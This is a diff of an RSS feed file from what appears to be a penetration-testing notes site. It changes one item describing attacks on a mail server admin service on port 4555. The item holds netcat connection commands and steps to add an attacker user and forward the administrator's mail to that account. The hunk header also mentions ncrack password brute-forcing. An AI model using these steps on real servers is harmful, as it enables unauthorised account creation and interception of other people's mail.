@@ -196,7 +196,7 @@ Credentials bruteforce # Using ncrack for one user ncrack -vv -u nina -P passwor
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/network/services-enumeration/4555_rsip/</guid>
-      <description>Forwarding admin&amp;rsquo;s mails # Connection through netcat (can test for creds) nc -nv &amp;lt;IP&amp;gt; 4555 # Get commands HELP # Get users (hopefully an admin?) listusers # Add user adduser haax ***REMOVED*** # Set an alias for our user setalias mailadmin haax # Set mail forwarding setforwarding mailadmin haax@lab.</description>
+      <description>Forwarding admin&amp;rsquo;s mails # Connection through netcat (can test for creds) nc -nv &amp;lt;IP&amp;gt; 4555 # Get commands HELP # Get users (hopefully an admin?) listusers # Add user adduser haax haaxpass # Set an alias for our user setalias mailadmin haax # Set mail forwarding setforwarding mailadmin haax@lab.</description>
     </item>
     
   </channel>
